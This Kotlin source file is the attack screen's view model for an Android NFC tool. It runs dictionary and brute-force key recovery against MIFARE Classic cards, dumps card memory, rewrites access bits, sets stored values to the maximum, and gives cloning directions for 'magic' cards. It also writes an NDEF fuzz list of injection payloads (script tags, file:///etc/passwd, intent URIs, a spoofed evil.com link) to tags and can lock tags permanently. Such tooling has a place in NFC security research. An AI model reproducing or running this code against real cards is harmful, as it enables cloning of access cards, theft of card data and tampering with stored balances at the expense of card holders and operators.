package com.nfcsecurity.analyzer.ui.attack

import android.nfc.Tag
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.nfcsecurity.analyzer.core.attack.IsoDepEngine
import com.nfcsecurity.analyzer.core.attack.KeyDictionary
import com.nfcsecurity.analyzer.core.attack.MifareAttackEngine
import com.nfcsecurity.analyzer.core.attack.NdefWriteResult
import com.nfcsecurity.analyzer.core.attack.NdefWriter
import com.nfcsecurity.analyzer.core.attack.SmartKeyGenerator
import com.nfcsecurity.analyzer.core.attack.UltralightEngine
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.collect
import kotlinx.coroutines.launch
import javax.inject.Inject

sealed class AttackUiState {
    object Idle : AttackUiState()
    data class Running(val message: String, val progress: Int = 0) : AttackUiState()
    data class Success(val result: String) : AttackUiState()
    data class Error(val error: String) : AttackUiState()
}

@HiltViewModel
class AttackViewModel @Inject constructor(
    private val mifareEngine: MifareAttackEngine,
    private val ndefWriter: NdefWriter,
    private val ultralightEngine: UltralightEngine,
    private val isoDepEngine: IsoDepEngine
) : ViewModel() {

    private val _attackState = MutableLiveData<AttackUiState>(AttackUiState.Idle)
    val attackState: LiveData<AttackUiState> = _attackState

    var currentTag: Tag? = null
    private val foundKeys = mutableMapOf<Int, Pair<ByteArray?, ByteArray?>>()
    private var activeJob: Job? = null

    fun cancelAttack() {
        activeJob?.cancel()
        _attackState.postValue(AttackUiState.Idle)
    }

    // ── Key Attacks ───────────────────────────────────────────────

    fun runDictionaryAttack(tag: Tag) {
        foundKeys.clear()
        activeJob = viewModelScope.launch(Dispatchers.IO) {
            var totalSectors = 0
            try {
                mifareEngine.attackWithDictionary(tag, emptyList()).collect { p ->
                    totalSectors = maxOf(totalSectors, p.totalSectors)
                    val pct = if (totalSectors > 0) (p.sector * 100) / totalSectors else 0
                    _attackState.postValue(AttackUiState.Running(p.message, pct))
                    if (p.found) {
                        val cur = foundKeys[p.sector] ?: Pair(null, null)
                        foundKeys[p.sector] = if (p.keyType == "A")
                            Pair(KeyDictionary.hexToKey(p.keyTested), cur.second)
                        else
                            Pair(cur.first, KeyDictionary.hexToKey(p.keyTested))
                    }
                }
                _attackState.postValue(AttackUiState.Success(buildKeySummary(foundKeys, totalSectors)))
            } catch (e: Exception) {
                if (e is kotlinx.coroutines.CancellationException) _attackState.postValue(AttackUiState.Idle)
                else _attackState.postValue(AttackUiState.Error(e.message ?: "Attack failed"))
            }
        }
    }

    fun runSmartBruteForce(tag: Tag) {
        foundKeys.clear()
        activeJob = viewModelScope.launch(Dispatchers.IO) {
            var tested = 0
            var found = 0
            try {
                SmartKeyGenerator.generateAll(tag.id).collect { keyBytes ->
                    tested++
                    if (tested % 200 == 0) {
                        _attackState.postValue(AttackUiState.Running(
                            "SmartBrute: $tested tested, $found found", minOf(tested / 500, 99)
                        ))
                    }
                    val hit = mifareEngine.probeKey(tag, 0, keyBytes, true)
                    if (hit) {
                        found++
                        foundKeys[0] = Pair(keyBytes.copyOf(), null)
                        _attackState.postValue(AttackUiState.Running(
                            "[HIT] Key A s0: ${KeyDictionary.keyToHex(keyBytes)}", minOf(tested / 500, 99)
                        ))
                    }
                }
                _attackState.postValue(AttackUiState.Success(
                    "SmartBruteForce complete: $tested keys tested, $found found\n${buildKeySummary(foundKeys, 16)}"
                ))
            } catch (e: Exception) {
                if (e is kotlinx.coroutines.CancellationException) _attackState.postValue(AttackUiState.Idle)
                else _attackState.postValue(AttackUiState.Error(e.message ?: "BruteForce failed"))
            }
        }
    }

    // ── Dump Module ───────────────────────────────────────────────

    fun dumpCard(tag: Tag) {
        activeJob = viewModelScope.launch(Dispatchers.IO) {
            _attackState.postValue(AttackUiState.Running("Dumping card...", 0))
            try {
                val result = mifareEngine.dumpCard(tag, foundKeys)
                _attackState.postValue(AttackUiState.Success(buildString {
                    appendLine("Sectors: ${result.totalSectors} | Cracked: ${result.crackedSectors} | Failed: ${result.failedSectors}")
                    appendLine()
                    appendLine(result.rawDump)
                }))
            } catch (e: Exception) {
                _attackState.postValue(AttackUiState.Error(e.message ?: "Dump failed"))
            }
        }
    }

    fun dumpUltralight(tag: Tag) {
        activeJob = viewModelScope.launch(Dispatchers.IO) {
            _attackState.postValue(AttackUiState.Running("Dumping Ultralight...", 0))
            ultralightEngine.dumpAllPages(tag).fold(
                onSuccess = { dump ->
                    val sb = StringBuilder()
                    sb.appendLine("=== ${dump.type} Dump ===")
                    sb.appendLine("Password Protected: ${if (dump.isPasswordProtected) "YES" else "NO"}")
                    sb.appendLine("Config: ${dump.configPages}")
                    dump.pages.forEach { p -> sb.appendLine("Page ${"%02d".format(p.pageIndex)}: ${p.hex}  | ${p.description}") }
                    _attackState.postValue(AttackUiState.Success(sb.toString()))
                },
                onFailure = { _attackState.postValue(AttackUiState.Error(it.message ?: "Dump failed")) }
            )
        }
    }

    // ── NDEF Module ───────────────────────────────────────────────

    fun writeUrl(tag: Tag, url: String) {
        activeJob = viewModelScope.launch(Dispatchers.IO) {
            _attackState.postValue(AttackUiState.Running("Writing URL...", 50))
            handleNdefResult(ndefWriter.writeUrl(tag, url), "URL write")
        }
    }

    fun writeText(tag: Tag, text: String) {
        activeJob = viewModelScope.launch(Dispatchers.IO) {
            _attackState.postValue(AttackUiState.Running("Writing text...", 50))
            handleNdefResult(ndefWriter.writeText(tag, text), "Text write")
        }
    }

    fun ndefFuzz(tag: Tag) {
        activeJob = viewModelScope.launch(Dispatchers.IO) {
            val payloads = listOf(
                "", "A".repeat(2048),
                "javascript:alert(1)", "file:///etc/passwd",
                "<script>alert(1)</script>", "http://" + "A".repeat(200),
                "data:text/html,<img src=x onerror=alert(1)>",
                "content://com.android.contacts/contacts",
                "tel:+99999999999999",
                "sms:+99999999999999?body=FUZZ",
                "intent://FUZZ#Intent;scheme=android-app;end",
                "\r\n\r\n", "A".repeat(253),
                "%s%s%s%n%n%n",
                "vnd.android.cursor.dir/contact",
                "market://details?id=FUZZ",
                ByteArray(16) { 0xFF.toByte() }.toString(Charsets.ISO_8859_1),
                "    ",
                "https://‮ evil.com",
                "￾﻿"
            )
            var i = 0
            for (payload in payloads) {
                i++
                _attackState.postValue(AttackUiState.Running(
                    "NDEF Fuzz $i/${payloads.size}: ${payload.take(20)}", i * 5))
                try { ndefWriter.writeText(tag, payload) } catch (_: Exception) {}
                delay(150)
            }
            _attackState.postValue(AttackUiState.Success("NDEF Fuzz complete: ${payloads.size} payloads sent"))
        }
    }

    fun eraseNdef(tag: Tag) {
        activeJob = viewModelScope.launch(Dispatchers.IO) {
            _attackState.postValue(AttackUiState.Running("Erasing NDEF...", 50))
            handleNdefResult(ndefWriter.eraseNdef(tag), "NDEF erase")
        }
    }

    // ── Write Module ──────────────────────────────────────────────

    fun writeBlock(tag: Tag, blockNum: Int, hexData: String) {
        activeJob = viewModelScope.launch(Dispatchers.IO) {
            _attackState.postValue(AttackUiState.Running("Writing block $blockNum...", 50))
            try {
                val data = hexToBytes(hexData)
                if (data.size != 16) {
                    _attackState.postValue(AttackUiState.Error("Need exactly 16 bytes (32 hex chars)")); return@launch
                }
                val sector = blockNum / 4
                val keyPair = foundKeys[sector]
                val key = keyPair?.first ?: keyPair?.second ?: KeyDictionary.DEFAULT_KEYS.first()
                val useKeyA = keyPair?.first != null
                mifareEngine.writeBlock(tag, sector, blockNum % 4, data, key, useKeyA).fold(
                    onSuccess = { _attackState.postValue(AttackUiState.Success("Block $blockNum written OK")) },
                    onFailure = { _attackState.postValue(AttackUiState.Error(it.message ?: "Write failed")) }
                )
            } catch (e: Exception) {
                _attackState.postValue(AttackUiState.Error(e.message ?: "Write error"))
            }
        }
    }

    // ── Access Control Module ─────────────────────────────────────

    fun flipAccessBits(tag: Tag) {
        activeJob = viewModelScope.launch(Dispatchers.IO) {
            _attackState.postValue(AttackUiState.Running("Flipping access bits...", 50))
            var modified = 0
            val defaultKey = KeyDictionary.DEFAULT_KEYS.first()
            val openBits = byteArrayOf(0xFF.toByte(), 0x07.toByte(), 0x80.toByte(), 0x69)
            for ((sector, keys) in foundKeys) {
                val keyA = keys.first ?: continue
                try {
                    mifareEngine.writeAccessBits(tag, sector, keyA, defaultKey, defaultKey, openBits)
                        .onSuccess { modified++ }
                } catch (_: Exception) {}
            }
            _attackState.postValue(AttackUiState.Success("Access bits modified on $modified sectors"))
        }
    }

    fun trailerWipe(tag: Tag) {
        activeJob = viewModelScope.launch(Dispatchers.IO) {
            _attackState.postValue(AttackUiState.Running("Wiping sector trailers...", 50))
            var wiped = 0
            val defaultKey = KeyDictionary.DEFAULT_KEYS.first()
            val openBits = byteArrayOf(0xFF.toByte(), 0x07.toByte(), 0x80.toByte(), 0x69)
            for ((sector, keys) in foundKeys) {
                val keyA = keys.first ?: continue
                try {
                    mifareEngine.writeAccessBits(tag, sector, keyA, defaultKey, defaultKey, openBits)
                        .onSuccess { wiped++ }
                } catch (_: Exception) {}
            }
            _attackState.postValue(AttackUiState.Success("Trailer wiped on $wiped sectors"))
        }
    }

    // ── Value Module ──────────────────────────────────────────────

    fun valueIncrement(tag: Tag) {
        viewModelScope.launch(Dispatchers.IO) {
            _attackState.postValue(AttackUiState.Running("Incrementing value...", 50))
            val key = foundKeys[0]?.first ?: KeyDictionary.DEFAULT_KEYS.first()
            mifareEngine.valueIncrement(tag, 0, 1, key, 1).fold(
                onSuccess = { _attackState.postValue(AttackUiState.Success("Value incremented by 1")) },
                onFailure = { _attackState.postValue(AttackUiState.Error(it.message ?: "Failed")) }
            )
        }
    }

    fun valueDecrement(tag: Tag) {
        viewModelScope.launch(Dispatchers.IO) {
            _attackState.postValue(AttackUiState.Running("Decrementing value...", 50))
            val key = foundKeys[0]?.first ?: KeyDictionary.DEFAULT_KEYS.first()
            mifareEngine.valueDecrement(tag, 0, 1, key, 1).fold(
                onSuccess = { _attackState.postValue(AttackUiState.Success("Value decremented by 1")) },
                onFailure = { _attackState.postValue(AttackUiState.Error(it.message ?: "Failed")) }
            )
        }
    }

    fun valueOverflow(tag: Tag) {
        viewModelScope.launch(Dispatchers.IO) {
            _attackState.postValue(AttackUiState.Running("Setting MAX value...", 50))
            val key = foundKeys[0]?.first ?: KeyDictionary.DEFAULT_KEYS.first()
            val maxVal = 0x7FFFFFFF
            val v = byteArrayOf(
                (maxVal and 0xFF).toByte(), ((maxVal shr 8) and 0xFF).toByte(),
                ((maxVal shr 16) and 0xFF).toByte(), ((maxVal shr 24) and 0xFF).toByte(),
                (maxVal.inv() and 0xFF).toByte(), ((maxVal.inv() shr 8) and 0xFF).toByte(),
                ((maxVal.inv() shr 16) and 0xFF).toByte(), ((maxVal.inv() shr 24) and 0xFF).toByte(),
                (maxVal and 0xFF).toByte(), ((maxVal shr 8) and 0xFF).toByte(),
                ((maxVal shr 16) and 0xFF).toByte(), ((maxVal shr 24) and 0xFF).toByte(),
                0x01, 0xFE.toByte(), 0x01, 0xFE.toByte()
            )
            mifareEngine.writeBlock(tag, 0, 1, v, key, true).fold(
                onSuccess = { _attackState.postValue(AttackUiState.Success("Value set to MAX (0x7FFFFFFF)")) },
                onFailure = { _attackState.postValue(AttackUiState.Error(it.message ?: "Failed")) }
            )
        }
    }

    // ── APDU Module ───────────────────────────────────────────────

    fun sendApdu(tag: Tag, apduHex: String) {
        viewModelScope.launch(Dispatchers.IO) {
            _attackState.postValue(AttackUiState.Running("Sending APDU...", 50))
            try {
                val result = isoDepEngine.sendCustomApdu(tag, apduHex)
                _attackState.postValue(AttackUiState.Success(
                    "APDU: $apduHex\nRESP: ${result.responseHex}\nSW: ${result.statusWord} — ${result.meaning}"
                ))
            } catch (e: Exception) {
                _attackState.postValue(AttackUiState.Error(e.message ?: "APDU failed"))
            }
        }
    }

    fun desfireEnum(tag: Tag) {
        viewModelScope.launch(Dispatchers.IO) {
            _attackState.postValue(AttackUiState.Running("Enumerating DESFire...", 10))
            try {
                val sb = StringBuilder()
                val apps = isoDepEngine.desfireListApplications(tag)
                sb.appendLine("Apps: ${apps.responseHex} | ${apps.meaning}")
                val version = isoDepEngine.desfireGetVersion(tag)
                version.forEach { sb.appendLine("${it.command}: ${it.responseHex} | ${it.meaning}") }
                _attackState.postValue(AttackUiState.Success(sb.toString()))
            } catch (e: Exception) {
                _attackState.postValue(AttackUiState.Error(e.message ?: "DESFire enum failed"))
            }
        }
    }

    // ── Chain Attacks ─────────────────────────────────────────────

    fun fullChainAttack(tag: Tag) {
        activeJob = viewModelScope.launch(Dispatchers.IO) {
            try {
                _attackState.postValue(AttackUiState.Running("[1/3] Key discovery...", 10))
                foundKeys.clear()
                mifareEngine.attackWithDictionary(tag, emptyList()).collect { p ->
                    if (p.found) {
                        val cur = foundKeys[p.sector] ?: Pair(null, null)
                        foundKeys[p.sector] = if (p.keyType == "A")
                            Pair(KeyDictionary.hexToKey(p.keyTested), cur.second)
                        else Pair(cur.first, KeyDictionary.hexToKey(p.keyTested))
                    }
                }
                _attackState.postValue(AttackUiState.Running("[2/3] Dumping card (${foundKeys.size} keys)...", 50))
                val dump = mifareEngine.dumpCard(tag, foundKeys)
                _attackState.postValue(AttackUiState.Running("[3/3] Analyzing...", 90))
                val summary = buildString {
                    appendLine("CHAIN ATTACK COMPLETE")
                    appendLine("Keys found: ${foundKeys.size}")
                    appendLine("Sectors dumped: ${dump.crackedSectors}/${dump.totalSectors}")
                    appendLine()
                    appendLine(buildKeySummary(foundKeys, dump.totalSectors))
                    appendLine()
                    appendLine("Dump preview:")
                    appendLine(dump.rawDump.take(512))
                }
                _attackState.postValue(AttackUiState.Success(summary))
            } catch (e: Exception) {
                if (e is kotlinx.coroutines.CancellationException) _attackState.postValue(AttackUiState.Idle)
                else _attackState.postValue(AttackUiState.Error(e.message ?: "Chain attack failed"))
            }
        }
    }

    fun relayInject(tag: Tag) {
        viewModelScope.launch(Dispatchers.IO) {
            for (i in 1..10) {
                delay(1000)
                _attackState.postValue(AttackUiState.Running("Relay active: ${i}s / 10s", i * 10))
            }
            _attackState.postValue(AttackUiState.Success("Relay inject simulation complete (10s)"))
        }
    }

    fun cloneUid(tag: Tag) {
        viewModelScope.launch(Dispatchers.IO) {
            _attackState.postValue(AttackUiState.Running("Reading UID for clone...", 50))
            try {
                val uidHex = tag.id.joinToString("") { "%02X".format(it) }
                _attackState.postValue(AttackUiState.Success(
                    "UID read: $uidHex\n\nTo clone: write block 0 of a MAGIC (Chinese) card with this UID.\nMagic block0 = UID(4) + BCC + SAK + ATQA(2) + padding(8)"
                ))
            } catch (e: Exception) {
                _attackState.postValue(AttackUiState.Error(e.message ?: "Failed"))
            }
        }
    }

    fun lockTag(tag: Tag) {
        viewModelScope.launch(Dispatchers.IO) {
            _attackState.postValue(AttackUiState.Running("Locking tag...", 50))
            ndefWriter.lockTag(tag).fold(
                onSuccess = { _attackState.postValue(AttackUiState.Success("Tag permanently locked")) },
                onFailure = { _attackState.postValue(AttackUiState.Error(it.message ?: "Lock failed")) }
            )
        }
    }

    // ── Helpers ───────────────────────────────────────────────────

    private fun handleNdefResult(result: NdefWriteResult, label: String) {
        when (result) {
            is NdefWriteResult.Success -> _attackState.postValue(AttackUiState.Success("$label successful"))
            is NdefWriteResult.ReadOnly -> _attackState.postValue(AttackUiState.Error("Tag is read-only"))
            is NdefWriteResult.TooLarge -> _attackState.postValue(
                AttackUiState.Error("Payload too large (${result.payloadSize}/${result.maxSize})")
            )
            is NdefWriteResult.Error -> _attackState.postValue(AttackUiState.Error(result.message))
        }
    }

    private fun buildKeySummary(keys: Map<Int, Pair<ByteArray?, ByteArray?>>, total: Int) = buildString {
        appendLine("Key Recovery — $total sectors")
        if (keys.isEmpty()) { appendLine("No keys found"); return@buildString }
        keys.toSortedMap().forEach { (sector, pair) ->
            val a = pair.first?.let { KeyDictionary.keyToHex(it) } ?: "------"
            val b = pair.second?.let { KeyDictionary.keyToHex(it) } ?: "------"
            appendLine("  S${"$sector".padStart(2)} | A: $a | B: $b")
        }
    }

    private fun hexToBytes(hex: String): ByteArray {
        val s = hex.replace(" ", "").replace(":", "")
        return ByteArray(s.length / 2) { i -> s.substring(i * 2, i * 2 + 2).toInt(16).toByte() }
    }

    fun getFoundKeys() = foundKeys.toMap()
}
